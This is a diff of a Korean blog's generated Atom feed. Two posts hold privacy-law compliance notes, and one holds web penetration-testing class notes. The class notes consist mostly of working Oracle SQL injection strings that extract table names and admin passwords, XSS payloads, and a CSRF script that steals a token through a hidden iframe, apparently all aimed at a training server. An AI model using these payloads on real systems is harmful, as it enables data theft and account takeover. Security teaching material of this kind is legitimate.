@@ -1,30 +1,1353 @@
----
-layout: null
----
-<?xml version="1.0" encoding="UTF-8"?>
-<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
-  <channel>
-    <title>{{ site.title | xml_escape }}</title>
-    <description>{{ site.description | xml_escape }}</description>
-    <link>{{ site.url }}{{ site.baseurl }}/</link>
-    <atom:link href="{{ "/feed.xml" | prepend: site.baseurl | prepend: site.url }}" rel="self" type="application/rss+xml"/>
-    <pubDate>{{ site.time | date_to_rfc822 }}</pubDate>
-    <lastBuildDate>{{ site.time | date_to_rfc822 }}</lastBuildDate>
-    <generator>Jekyll v{{ jekyll.version }}</generator>
-    {% for post in site.posts limit:10 %}
-      <item>
-        <title>{{ post.title | xml_escape }}</title>
-        <description>{{ post.content | xml_escape }}</description>
-        <pubDate>{{ post.date | date_to_rfc822 }}</pubDate>
-        <link>{{ post.url | prepend: site.baseurl | prepend: site.url }}</link>
-        <guid isPermaLink="true">{{ post.url | prepend: site.baseurl | prepend: site.url }}</guid>
-        {% for tag in post.tags %}
-        <category>{{ tag | xml_escape }}</category>
-        {% endfor %}
-        {% for cat in post.categories %}
-        <category>{{ cat | xml_escape }}</category>
-        {% endfor %}
-      </item>
-    {% endfor %}
-  </channel>
-</rss>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.6">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2020-03-08T15:27:25+09:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">To be Useful to the World</title><subtitle>이것저것 다하는 블로그</subtitle><author><name>Useworld</name></author><entry><title type="html">컨설팅</title><link href="http://localhost:4000/2018/09/08/consult.html" rel="alternate" type="text/html" title="컨설팅" /><published>2018-09-08T00:00:00+09:00</published><updated>2018-09-08T00:00:00+09:00</updated><id>http://localhost:4000/2018/09/08/consult</id><content type="html" xml:base="http://localhost:4000/2018/09/08/consult.html">&lt;h3 id=&quot;개인정보보호법&quot;&gt;개인정보보호법&lt;/h3&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;개인정보보호법 관련 고시
+고유식별정보의 정의
+법에서 말하는 암호화하여야 하는 개인정보란
+개인정보 파기 기준
+개인정보 유출 시 신고 기준
+개인정보보호 교육의 의무 기준
+개인정보 수집 이용 시 동의가 필요하지 않은 경우만 
+영상정보처리기기 안내판 기재 내용
+비밀번호 암호화 기준
+개인정보처리시스템 접속 기록 보관 기준&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;개인정보보호법 관련 고시
+    &lt;ul&gt;
+      &lt;li&gt;개인정보 영향평가에 관한 고시
+개인정보보호 관리체계 인증 등에 관한 고시
+개인정보의 안전성 확보조치 기준
+표준 개인정보 보호지침&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;고유식별정보의 정의
+    &lt;ul&gt;
+      &lt;li&gt;개인을 고유하게 구별하기 위하여 부여된 식별정보
+「주민등록법」 제7조의2제1항에 따른 주민등록번호
+   「여권법」 제7조제1항제1호에 따른 여권번호
+   「도로교통법」 제80조에 따른 운전면허의 면허번호
+   「출입국관리법」 제31조제4항에 따른 외국인등록번호&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;법에서 말하는 암호화해야 하는 개인정보란
+  주민등록번호, 고유식별정보, 생체정보, 등&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;개인정보 파기 기준
+    &lt;ul&gt;
+      &lt;li&gt;개인정보처리자는 보유기간의 경과, 개인정보의 처리 목적 달성 등 그 개인정보가 불필요하게 되었을 때에는 지체 없이 그 개인정보를 파기하여야 한다&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;개인정보 유출 시 신고 기준
+    &lt;ul&gt;
+      &lt;li&gt;1000명이상&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;개인정보보호 교육의 의무 기준
+    &lt;ul&gt;
+      &lt;li&gt;개인정보관리책임자 및 개인정보취급자 대상으로 연 2회 이상 교육 실시&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;개인정보 수집이용 시 동의가 필요하지 않는 경우란
+    &lt;ul&gt;
+      &lt;li&gt;법률에 특별한 규정이 있거나 법령상 의무를 준수하기 위하여 불가피한 경우&lt;/li&gt;
+      &lt;li&gt;공공기관이 법령 등에서 정하는 소관 업무의 수행을 위하여 불가피한 경우&lt;/li&gt;
+      &lt;li&gt;정보주체와의 계약의 체결 및 이행을 위하여 불가피하게 필요한 경우&lt;/li&gt;
+      &lt;li&gt;정보주체 또는 그 법정대리인이 의사표시를 할 수 없는 상태에 있거나 
+ 주소불명 등으로 사전 동의를 받을 수 없는 경우
+ 명백히 정보주체 또는 제3자의 급박한 생명, 신체, 재산의 이익을 위하여 필요     하다고 인정되는 경우&lt;/li&gt;
+      &lt;li&gt;개인정보처리자의 정당한 이익을 달성하기 위하여 필요한 경우
+ 명백하게 정보주체의 권리보다 우선하는 경우
+ 개인정보처리자의 정당한 이익과 상당한 관련이 있고 합리적인 범위를 
+ 초과하지 아니하는 경우에 한한다.&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;영상정보처리기기 안내판 기재 내용
+    &lt;ul&gt;
+      &lt;li&gt;설치 목적 및 장소&lt;/li&gt;
+      &lt;li&gt;촬영 범위 및 시간&lt;/li&gt;
+      &lt;li&gt;관리책임자 성명 및 연락처&lt;/li&gt;
+      &lt;li&gt;그 밖에 대통령령으로 정하는 사항&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;비밀번호 암호화 기준
+    &lt;ul&gt;
+      &lt;li&gt;제7조(개인정보의 암호화) ① 개인정보처리자는 고유식별정보, 비밀번호, 바이오정     보를 정보통신망을 통하여 송신하거나 보조저장매체 등을 통하여 전달하는 경    우에는 이를 암호화하여야 한다.&lt;/li&gt;
+    &lt;/ul&gt;
+
+    &lt;p&gt;② 개인정보처리자는 비밀번호 및 바이오정보는 암호화하여 저장하여야 한다. 다    만, 비밀번호를 저장하는 경우에는 복호화되지 아니하도록 일방향 암호화하여     저장하여야 한다.&lt;/p&gt;
+
+    &lt;p&gt;③ 개인정보처리자는 인터넷 구간 및 인터넷 구간과 내부망의 중간 지점(DMZ :     Demilitarized Zone)에 고유식별정보를 저장하는 경우에는 이를 암호화하여야 한    다.&lt;/p&gt;
+
+    &lt;p&gt;④ 개인정보처리자가 내부망에 고유식별정보를 저장하는 경우에는 다음 각 호의     기준에 따라 암호화의 적용여부 및 적용범위를 정하여 시행할 수 있다.&lt;/p&gt;
+
+    &lt;ol&gt;
+      &lt;li&gt;
+        &lt;p&gt;법 제33조에 따른 개인정보 영향평가의 대상이 되는 공공기관의 경우에는     해당 개인정보 영향평가의 결과&lt;/p&gt;
+      &lt;/li&gt;
+      &lt;li&gt;
+        &lt;p&gt;암호화 미적용시 위험도 분석에 따른 결과&lt;/p&gt;
+
+        &lt;p&gt;⑤ 개인정보처리자는 제1항, 제2항, 제3항, 또는 제4항에 따라 개인정보를 암호      화하는 경우 안전한 암호알고리즘으로 암호화하여 저장하여야 한다.&lt;/p&gt;
+
+        &lt;p&gt;⑥ 개인정보처리자는 암호화된 개인정보를 안전하게 보관하기 위하여 안전한 암      호 키 생성, 이용, 보관, 배포 및 파기 등에 관한 절차를 수립·시행하여야       한다.&lt;/p&gt;
+      &lt;/li&gt;
+    &lt;/ol&gt;
+  &lt;/li&gt;
+  &lt;li&gt;개인정보처리시스템 접속기록 보관 기준&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;개인정보처리시스템에 접속한 기록을 6개월 이상 보관·관리하여야 한다.&lt;/li&gt;
+&lt;/ul&gt;</content><author><name>Useworld</name></author><summary type="html">개인정보보호법</summary></entry><entry><title type="html">컨설팅</title><link href="http://localhost:4000/2018/09/07/%EC%BB%A8%EC%84%A4%ED%8C%85.html" rel="alternate" type="text/html" title="컨설팅" /><published>2018-09-07T00:00:00+09:00</published><updated>2018-09-07T00:00:00+09:00</updated><id>http://localhost:4000/2018/09/07/%EC%BB%A8%EC%84%A4%ED%8C%85</id><content type="html" xml:base="http://localhost:4000/2018/09/07/%EC%BB%A8%EC%84%A4%ED%8C%85.html">&lt;h3 id=&quot;개인정보보호법&quot;&gt;개인정보보호법&lt;/h3&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;개인정보보호법 관련 고시
+고유식별정보의 정의
+법에서 말하는 암호화하여야 하는 개인정보란
+개인정보 파기 기준
+개인정보 유출 시 신고 기준
+개인정보보호 교육의 의무 기준
+개인정보 수집 이용 시 동의가 필요하지 않은 경우만 
+영상정보처리기기 안내판 기재 내용
+비밀번호 암호화 기준
+개인정보처리시스템 접속 기록 보관 기준&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;개인정보보호법 관련 고시
+    &lt;ul&gt;
+      &lt;li&gt;개인정보 영향평가에 관한 고시
+개인정보보호 관리체계 인증 등에 관한 고시
+개인정보의 안전성 확보조치 기준
+표준 개인정보 보호지침&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;고유식별정보의 정의
+    &lt;ul&gt;
+      &lt;li&gt;개인을 고유하게 구별하기 위하여 부여된 식별정보
+「주민등록법」 제7조의2제1항에 따른 주민등록번호
+   「여권법」 제7조제1항제1호에 따른 여권번호
+   「도로교통법」 제80조에 따른 운전면허의 면허번호
+   「출입국관리법」 제31조제4항에 따른 외국인등록번호&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;법에서 말하는 암호화해야 하는 개인정보란
+  주민등록번호, 고유식별정보, 생체정보, 등&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;개인정보 파기 기준
+    &lt;ul&gt;
+      &lt;li&gt;개인정보처리자는 보유기간의 경과, 개인정보의 처리 목적 달성 등 그 개인정보가 불필요하게 되었을 때에는 지체 없이 그 개인정보를 파기하여야 한다&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;개인정보 유출 시 신고 기준
+    &lt;ul&gt;
+      &lt;li&gt;1000명이상&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;개인정보보호 교육의 의무 기준
+    &lt;ul&gt;
+      &lt;li&gt;개인정보관리책임자 및 개인정보취급자 대상으로 연 2회 이상 교육 실시&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;개인정보 수집이용 시 동의가 필요하지 않는 경우란
+    &lt;ul&gt;
+      &lt;li&gt;법률에 특별한 규정이 있거나 법령상 의무를 준수하기 위하여 불가피한 경우&lt;/li&gt;
+      &lt;li&gt;공공기관이 법령 등에서 정하는 소관 업무의 수행을 위하여 불가피한 경우&lt;/li&gt;
+      &lt;li&gt;정보주체와의 계약의 체결 및 이행을 위하여 불가피하게 필요한 경우&lt;/li&gt;
+      &lt;li&gt;정보주체 또는 그 법정대리인이 의사표시를 할 수 없는 상태에 있거나 
+ 주소불명 등으로 사전 동의를 받을 수 없는 경우
+ 명백히 정보주체 또는 제3자의 급박한 생명, 신체, 재산의 이익을 위하여 필요     하다고 인정되는 경우&lt;/li&gt;
+      &lt;li&gt;개인정보처리자의 정당한 이익을 달성하기 위하여 필요한 경우
+ 명백하게 정보주체의 권리보다 우선하는 경우
+ 개인정보처리자의 정당한 이익과 상당한 관련이 있고 합리적인 범위를 
+ 초과하지 아니하는 경우에 한한다.&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;영상정보처리기기 안내판 기재 내용
+    &lt;ul&gt;
+      &lt;li&gt;설치 목적 및 장소&lt;/li&gt;
+      &lt;li&gt;촬영 범위 및 시간&lt;/li&gt;
+      &lt;li&gt;관리책임자 성명 및 연락처&lt;/li&gt;
+      &lt;li&gt;그 밖에 대통령령으로 정하는 사항&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;비밀번호 암호화 기준
+    &lt;ul&gt;
+      &lt;li&gt;제7조(개인정보의 암호화) ① 개인정보처리자는 고유식별정보, 비밀번호, 바이오정     보를 정보통신망을 통하여 송신하거나 보조저장매체 등을 통하여 전달하는 경    우에는 이를 암호화하여야 한다.&lt;/li&gt;
+    &lt;/ul&gt;
+
+    &lt;p&gt;② 개인정보처리자는 비밀번호 및 바이오정보는 암호화하여 저장하여야 한다. 다    만, 비밀번호를 저장하는 경우에는 복호화되지 아니하도록 일방향 암호화하여     저장하여야 한다.&lt;/p&gt;
+
+    &lt;p&gt;③ 개인정보처리자는 인터넷 구간 및 인터넷 구간과 내부망의 중간 지점(DMZ :     Demilitarized Zone)에 고유식별정보를 저장하는 경우에는 이를 암호화하여야 한    다.&lt;/p&gt;
+
+    &lt;p&gt;④ 개인정보처리자가 내부망에 고유식별정보를 저장하는 경우에는 다음 각 호의     기준에 따라 암호화의 적용여부 및 적용범위를 정하여 시행할 수 있다.&lt;/p&gt;
+
+    &lt;ol&gt;
+      &lt;li&gt;
+        &lt;p&gt;법 제33조에 따른 개인정보 영향평가의 대상이 되는 공공기관의 경우에는     해당 개인정보 영향평가의 결과&lt;/p&gt;
+      &lt;/li&gt;
+      &lt;li&gt;
+        &lt;p&gt;암호화 미적용시 위험도 분석에 따른 결과&lt;/p&gt;
+
+        &lt;p&gt;⑤ 개인정보처리자는 제1항, 제2항, 제3항, 또는 제4항에 따라 개인정보를 암호      화하는 경우 안전한 암호알고리즘으로 암호화하여 저장하여야 한다.&lt;/p&gt;
+
+        &lt;p&gt;⑥ 개인정보처리자는 암호화된 개인정보를 안전하게 보관하기 위하여 안전한 암      호 키 생성, 이용, 보관, 배포 및 파기 등에 관한 절차를 수립·시행하여야       한다.&lt;/p&gt;
+      &lt;/li&gt;
+    &lt;/ol&gt;
+  &lt;/li&gt;
+  &lt;li&gt;개인정보처리시스템 접속기록 보관 기준&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;개인정보처리시스템에 접속한 기록을 6개월 이상 보관·관리하여야 한다.&lt;/li&gt;
+&lt;/ul&gt;</content><author><name>Useworld</name></author><summary type="html">개인정보보호법</summary></entry><entry><title type="html">웹 모의해킹</title><link href="http://localhost:4000/2018/08/27/%EC%9B%B9%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9.html" rel="alternate" type="text/html" title="웹 모의해킹" /><published>2018-08-27T00:00:00+09:00</published><updated>2018-08-27T00:00:00+09:00</updated><id>http://localhost:4000/2018/08/27/%EC%9B%B9%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9</id><content type="html" xml:base="http://localhost:4000/2018/08/27/%EC%9B%B9%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9.html">&lt;p&gt;SK -&amp;gt; AT&amp;amp;T SMS 보낼때 국가간 Protocol 변환시 인증정보 확인안함&lt;/p&gt;
+
+&lt;p&gt;도감청 가능, 가로채기해서 내가 받기도 가능. 여태 패치 안됨.&lt;/p&gt;
+
+&lt;p&gt;Spring, Samba, BlueBorne&lt;/p&gt;
+
+&lt;p&gt;보고서 - 개요, 문제풀이&lt;/p&gt;
+
+&lt;p&gt;SQL Injection&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Union&lt;/p&gt;
+
+  &lt;p&gt;Error Based&lt;/p&gt;
+
+  &lt;p&gt;Blind&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;select num, dong, juso from post where dong like %’p-dong’%&lt;/p&gt;
+
+&lt;p&gt;union select id, pw, name from member&lt;/p&gt;
+
+&lt;p&gt;oracle : all_tables, all_tab_columns(table_name, column_name)&lt;/p&gt;
+
+&lt;p&gt;영등포%’, order by 4’&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;컬럼개수 3&lt;/li&gt;
+  &lt;li&gt;컬럼타입&lt;/li&gt;
+  &lt;li&gt;테이블명&lt;/li&gt;
+  &lt;li&gt;컬럼명&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;Burpsuit&lt;/p&gt;
+
+&lt;p&gt;pentest monkey&lt;/p&gt;
+
+&lt;p&gt;sql 명령어들&lt;/p&gt;
+
+&lt;p&gt;sql fiddle&lt;/p&gt;
+
+&lt;p&gt;burp에서 % 인코딩을 해야되는지 안해도되는지 확인&lt;/p&gt;
+
+&lt;p&gt;암호화 하기전 salt를 더함&lt;/p&gt;
+
+&lt;p&gt;union&lt;/p&gt;
+
+&lt;p&gt;select rownum, table_name from user_tables where row = 2는 rownum이 가상이라 1을 지우고 다시 1부터 붙어영원히 2에 도달하지않음&lt;/p&gt;
+
+&lt;p&gt;select table_name from (select rownum as rnum, table_name from user_tables) where rnum = 2&lt;/p&gt;
+
+&lt;p&gt;count 10&lt;/p&gt;
+
+&lt;p&gt;errorbased&lt;/p&gt;
+
+&lt;p&gt;각 sql별 친절한 에러메세지를 주는 function이 있음&lt;/p&gt;
+
+&lt;p&gt;찾아서 넣자&lt;/p&gt;
+
+&lt;p&gt;ctxsys.drithsx.sn(user,(select user from dual where rownum=1))=1–&lt;/p&gt;
+
+&lt;p&gt;김세용’ and ctxsys.drithsx.sn(1,(select user from dual where rownum=1)) = 1 –&lt;/p&gt;
+
+&lt;h3 id=&quot;ordsysord_dicomgetmappingxpath&quot;&gt;ordsys.ord_dicom.getmappingxpath()&lt;/h3&gt;
+
+&lt;p&gt;김세용’ and ordsys.ord_dicom.getmappingxpath((select user from dual)) = 1 –&lt;/p&gt;
+
+&lt;p&gt;김세용’ and dbms_aw_xml.readawmetadata((select user from dual)) = 1 –&lt;/p&gt;
+
+&lt;p&gt;김세용’ and ordsys.ord_dicom.getmappingxpath((select table_name from (select rownum as rnum, table_name from user_tables) where  rnum=1))=1–&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;dbms_aw_xml.readawmetadata()&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;김세용’ and dbms_aw_xml.readawmetadata((select table_name from (select rownum as rnum, table_name from user_tables) where  rnum=1),null) is null–&lt;/p&gt;
+
+&lt;p&gt;테이블명 찾기&lt;/p&gt;
+
+&lt;p&gt;김세용’ AND CTXSYS.DRITHSX.SN(user, (select table_name from (select rownum as rnum, table_name from user_tables) where  rnum=1))=1–&lt;/p&gt;
+
+&lt;p&gt;컬럼명 찾기&lt;/p&gt;
+
+&lt;p&gt;김세용’ AND CTXSYS.DRITHSX.SN(user, (select column_name from (select rownum as rnum, column_name from user_tab_columns where table_name=’LHSMEMBER3’) where  rnum=1))=1–&lt;/p&gt;
+
+&lt;p&gt;데이터 찾기 - id&lt;/p&gt;
+
+&lt;p&gt;김세용’ AND CTXSYS.DRITHSX.SN(user, (select id from (select rownum as rnum, id, pw from LHSMEMBER3) where  rnum=1))=1–&lt;/p&gt;
+
+&lt;p&gt;데이터 찾기 - pw&lt;/p&gt;
+
+&lt;p&gt;김세용’ AND CTXSYS.DRITHSX.SN(user, (select pw from (select rownum as rnum, id, pw from LHSMEMBER3 where id=’admin’) where  rnum=1))=1–&lt;/p&gt;
+
+&lt;h3 id=&quot;blind-sql-injection&quot;&gt;Blind SQL Injection&lt;/h3&gt;
+
+&lt;p&gt;select zipcode, dong, addr from lhspost where dong like %[&lt;strong&gt;__&lt;/strong&gt;&lt;strong&gt;&lt;em&gt;%’ and (&lt;/em&gt;&lt;/strong&gt;&lt;strong&gt;__&lt;/strong&gt;)’ and 1=1–]%’&lt;/p&gt;
+
+&lt;p&gt;문정2%1’ and ascii(substr((select table_name from (select rownum as rnum, table_name from user_tables) where rnum = 1), 1, 1)) = 75–&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;BSQL이 되는 정황증거를 개인카톡으로 제출하시오.&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;dl&gt;
+  &lt;dt&gt;1.1. 전체 파라미터 제출&lt;/dt&gt;
+  &lt;dd&gt;
+    &lt;p&gt;id=admin&amp;amp;pw=1234&lt;/p&gt;
+  &lt;/dd&gt;
+  &lt;dt&gt;1.2. 서버측 로직 제출&lt;/dt&gt;
+  &lt;dd&gt;
+    &lt;p&gt;왜 1.1이 실행되는지 소스코드(대략적인, 문법이 틀려도 됨)와 설명&lt;/p&gt;
+  &lt;/dd&gt;
+&lt;/dl&gt;
+
+&lt;p&gt;1.1 전체 파라미터&lt;/p&gt;
+
+&lt;p&gt;id=1&amp;amp;pw=1 -&amp;gt; 로그인 성공&lt;/p&gt;
+
+&lt;p&gt;id=1’ and 1=1–&amp;amp;pw=1 -&amp;gt; 로그인 성공&lt;/p&gt;
+
+&lt;p&gt;id=1’ and 1=2–&amp;amp;pw=1 -&amp;gt; 로그인 실패&lt;/p&gt;
+
+&lt;p&gt;id=1’ and ascii(substr((select table_name from (select rownum as rnum, table_name from user_tables) where rnum = 1), 1, 1)) = 76–&amp;amp;pw=1&lt;/p&gt;
+
+&lt;p&gt;이런식으로 id 부분에 Injection 가능합니다.&lt;/p&gt;
+
+&lt;p&gt;1.2. 서버측 로직 제출&lt;/p&gt;
+
+&lt;p&gt;select passwd from lhsmember3 where id = id입력값&lt;/p&gt;
+
+&lt;p&gt;if(passwd == 비밀번호입력값)&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;로그인성공
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;else&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;로그인 실패
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;이렇게 아이디에 해당하는 비밀번호만 가져와서&lt;/p&gt;
+
+&lt;p&gt;입력한 비밀번호와 비교하는 것 같습니다.&lt;/p&gt;
+
+&lt;p&gt;2번&lt;/p&gt;
+
+&lt;p&gt;1.&lt;/p&gt;
+
+&lt;p&gt;id=1’) and 1=1–&amp;amp;pw=1 -&amp;gt; 로그인 성공&lt;/p&gt;
+
+&lt;p&gt;id=1’) and 1=2–&amp;amp;pw=1 -&amp;gt; 로그인 실패&lt;/p&gt;
+
+&lt;p&gt;2.&lt;/p&gt;
+
+&lt;p&gt;select pw from from lhsmember3 where id=’1’and (‘1’=’1’)&lt;/p&gt;
+
+&lt;p&gt;1.&lt;/p&gt;
+
+&lt;p&gt;id=1’) and (‘1’=’1&amp;amp;pw=1 -&amp;gt; 로그인 성공&lt;/p&gt;
+
+&lt;p&gt;id=1’) and (‘1’=’2&amp;amp;pw=2 -&amp;gt; 로그인 실패&lt;/p&gt;
+
+&lt;p&gt;select pw from lhsmember3 where (id=’ID입력값’)&lt;/p&gt;
+
+&lt;p&gt;select pw from lhsmember3 where (id=’ 1’ and ‘1’=’1 ‘)&lt;/p&gt;
+
+&lt;p&gt;1.&lt;/p&gt;
+
+&lt;p&gt;sDate=20150102&amp;amp;eDate=20161231’) and 1=1– -&amp;gt; 게시글 잘 나옴&lt;/p&gt;
+
+&lt;p&gt;sDate=20150102&amp;amp;eDate=20161231’) and 1=2– -&amp;gt; 게시물 없음&lt;/p&gt;
+
+&lt;p&gt;select * from board where (date &amp;gt; ‘sDate’ and date &amp;lt; ‘eDate’)&lt;/p&gt;
+
+&lt;p&gt;select * from lhsboard where date between to_date(‘sDate’, ‘YYYYMMDD’) and to_date(‘eDate’, ‘YYYYMMDD’)&lt;/p&gt;
+
+&lt;p&gt;select * from lhsboard where date &amp;gt; to_date(‘sDate’, ‘YYYYMMDD’) and date &amp;lt; to_date(‘eDate’, ‘YYYYMMDD’)&lt;/p&gt;
+
+&lt;p&gt;1%’) and ascii(substr((select table_name from (select rownum as rnum, table_name from user_tables) where rnum = 1), 1, 1)) = 75–&lt;/p&gt;
+
+&lt;p&gt;Select * from board where (‘check1’ like ‘%searchtext%’) order by asc&lt;/p&gt;
+
+&lt;p&gt;parameter1 : select/*&lt;/p&gt;
+
+&lt;p&gt;parameter2 : */from&lt;/p&gt;
+
+&lt;h3 id=&quot;xss&quot;&gt;XSS&lt;/h3&gt;
+
+&lt;p&gt;&amp;lt;input name=”test” type=”text” value=”asdf”&amp;gt;&lt;/p&gt;
+
+&lt;p&gt;입력:	asdf”&amp;gt;&amp;lt;script&amp;gt;alert(“1”)&amp;lt;/script&amp;gt;&amp;lt;”&lt;/p&gt;
+
+&lt;!-- alsfdjksdkljlakejfklwaflkaj asdf asfkdljsdlkfj--&gt;
+
+&lt;p&gt;입력: asdf–&amp;gt;&amp;lt;script&amp;gt;xss&amp;lt;/script&amp;gt;&amp;lt;!–&lt;/p&gt;
+
+&lt;p&gt;&amp;lt;img src=”X” onerror=’alert(xss)’&amp;gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;보안대책&quot;&gt;보안대책&lt;/h3&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;어디서 : 입력값 &amp;gt; 출력값(이미 악성코드가 저장되어 있는경우 패치시에만)&lt;/li&gt;
+  &lt;li&gt;무엇을 : 꺽쇠, 따옴표, onerror, onmouseover등의 직접 javascript 들어가는 파라메터&lt;/li&gt;
+  &lt;li&gt;어떻게 : 근본적인 해결책&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;특수문자를 막는다.&lt;/p&gt;
+
+&lt;p&gt;&amp;lt;,&amp;gt;,(,),’,”&lt;/p&gt;
+
+&lt;p&gt;&amp;lt; -&amp;gt; &amp;amp;\lt;&lt;/p&gt;
+
+&lt;p&gt;&amp;gt; -&amp;gt; &amp;amp;\gt;”&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;p&gt;다막고 Whitelist Filter&lt;/p&gt;
+
+&lt;p&gt;&amp;amp;\lt;p&amp;amp;\gt; -&amp;gt; &amp;lt;p&amp;gt;&lt;/p&gt;
+
+&lt;p&gt;Blacklist Filter&lt;/p&gt;
+
+&lt;p&gt;“Onerror” -&amp;gt; “x-onerror”&lt;/p&gt;
+
+&lt;p&gt;지워버리면 on&lt;strong&gt;onerror&lt;/strong&gt;error 이렇게 하면 지워져도 다시 우회됨&lt;/p&gt;
+
+&lt;p&gt;“onmouseover” -&amp;gt;&lt;/p&gt;
+
+&lt;p&gt;input 이용
+asdf”&amp;gt;&lt;script&gt;alert('seyong');&lt;/script&gt;&lt;/p&gt;
+
+&lt;p&gt;주석 이용
+asdf–&amp;gt;&lt;script&gt;alert('seyong');&lt;/script&gt;&amp;lt;!–&lt;/p&gt;
+
+&lt;p&gt;var test 이용
+11;}alert(“xss”);funtion test2(){var a=1&lt;/p&gt;
+
+&lt;p&gt;pagename 이용
+http://shanky.iptime.org:38080/lhs/join/checkPost2.jsp?pagename=asdf”&amp;gt;&lt;script&gt;alert('seyong');&lt;/script&gt;&amp;lt;”&amp;amp;dong=11&lt;/p&gt;
+
+&lt;p&gt;q1.
+&lt;script&gt;alert('xss');&lt;/script&gt;&lt;/p&gt;
+
+&lt;p&gt;q2.&lt;/p&gt;
+&lt;iframe src=&quot;javascript:alert('XSS');&quot;&gt;&lt;/iframe&gt;
+
+&lt;p&gt;q3.
+http://shanky.iptime.org:38080/lhs/quiz2/q3/#’a’%3E%3Cscript%3Ealert(‘xss’);%3C/script%3E&lt;/p&gt;
+
+&lt;p&gt;q4.
+100’);alert(‘xss&lt;/p&gt;
+
+&lt;p&gt;q5.
+http://shanky.iptime.org:38080/lhs/quiz2/q5/signup.jsp?next=javascript:alert(%27xss%27)&lt;/p&gt;
+
+&lt;p&gt;q6.
+http://shanky.iptime.org:38080/lhs/quiz2/q6/#data:text/javascript,alert(‘xss’)&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;CSRF&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;get/post&lt;/p&gt;
+
+&lt;p&gt;referer&lt;/p&gt;
+
+&lt;p&gt;확인창&lt;/p&gt;
+
+&lt;p&gt;필터링&lt;/p&gt;
+
+&lt;p&gt;token&lt;/p&gt;
+
+&lt;p&gt;captcha&lt;/p&gt;
+
+&lt;iframe id=&quot;subwin&quot; src=&quot;http://shanky.iptime.org:38080/lhs/admshanks/levelup.jsp&quot; width=&quot;0&quot; height=&quot;0&quot; onload=&quot;fLoad()&quot;&gt;
+&lt;/iframe&gt;
+&lt;script&gt;
+function fLoad() {
+var wSub = document.getElementById('subwin');
+var iTok = wSub.contentWindow.document.getElementsByName(&quot;csrf_token&quot;)[0];
+var tok = iTok.value;
+wSub.src = &quot;http://shanky.iptime.org:38080/lhs/admshanks/levelupProcess.jsp?rid=seyong&amp;csrf_token=&quot; + tok + &quot;&amp;levels=10&quot;;
+}
